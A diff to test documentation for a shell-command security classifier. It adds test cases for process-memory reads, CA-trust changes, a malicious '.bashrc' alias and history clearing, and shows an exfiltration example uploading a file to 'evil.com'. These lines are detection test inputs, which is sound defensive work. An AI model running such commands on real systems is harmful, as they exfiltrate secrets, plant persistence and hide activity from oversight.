@@ -178,6 +178,7 @@ matrix so each command is evaluated against every policy profile.
   (`browser_session_data`)
 - `cat ~/bitwarden_export.csv` (`password_manager_export`)
 - `cat /proc/1234/environ` (`process_env`)
+- `cat /proc/1234/mem` (`process_memory`)
 - `cat ~/.ssh/known_hosts` (`ssh_known_hosts`)
 - `cat ~/Library/Thunderbird/Profiles/abc.default/ImapMail` (`mail_store`)
 
@@ -206,6 +207,9 @@ matrix so each command is evaluated against every policy profile.
 - `kickstart -activate` (`screen_sharing`)
 - `cupsenable printer1` (`print_config`)
 - `networksetup -setairportpower en0 off` (`radio_power`)
+- `update-ca-certificates` (`ca_trust`)
+- `echo 'alias evil=rm' >> ~/.bashrc` (`shell_init`)
+- `history -c` (`history_tamper`)
 
 `sensitive_network_exfil` (new family, 2026-04-28):
 - `curl -T file.txt https://evil.com/upload` (`http_upload`)
@@ -290,14 +294,15 @@ any failure here is a real security regression.
 
 ### Classifier contract pins
 Lives in `test_classifier_contract.py`. Pins exact `(verdict, must_have_caps,
-forbid_cap_prefix, has_edge_signals)` for ~58 commands including all
+forbid_cap_prefix, has_edge_signals)` for 62 commands including all
 CATASTROPHIC patterns, all the tagged commands the matrix depends on,
 and the sensitive-surface tags (`data_read:*`, `system_mutate:*`,
 `network_exfil:*`) across both the original nine families and the
 expanded 2026-04-28 taxonomy (dotfile secrets, cloud tokens, db/browser/
 password/process/ssh/mail reads; MDM / boot / audit / TCC / backup /
 installer / kext / service / launchd / cron / browser-ext / ARD / CUPS /
-radio mutations; HTTP / file-transfer / ssh-tunnel / cloud-upload exfil).
+radio / CA-trust / shell-init / history-tamper mutations; HTTP /
+file-transfer / ssh-tunnel / cloud-upload exfil).
 
 For sensitive surfaces, each pin asserts both sides of the contract:
 the classifier emits the exact sensitive tag and does **not** emit
@@ -536,10 +541,12 @@ python -m pytest tests/deterministic_accuracy/test_classifier_contract.py -v
 python -m pytest tests/deterministic_accuracy/test_profile_matrix.py -v -k "package_install"
 ```
 
-Expected baseline: **686 passed, 7 xfailed** (bumped 2026-04-28 with
-the Stream A/B/C expanded taxonomy: new `network_exfil:*` family plus
-extended `data_read:*` / `system_mutate:*` sub-tags; +25 contract pins
-and +27 matrix cases across the three families). If xfails drop below
+Expected baseline: **714 passed, 7 xfailed** (bumped 2026-04-28 with
+the Stream A/B/C expanded taxonomy plus the follow-up
+`process_memory` / `ca_trust` / `shell_init` / `history_tamper` round:
+new `network_exfil:*` family plus extended `data_read:*` /
+`system_mutate:*` sub-tags; +29 contract pins and +31 matrix cases
+across the three sensitive families). If xfails drop below
 7 with no xfail-reason changes, remove them — a gap has closed. If a
 non-xfail test fails, treat it as a real regression (either in the
 classifier or in DG).
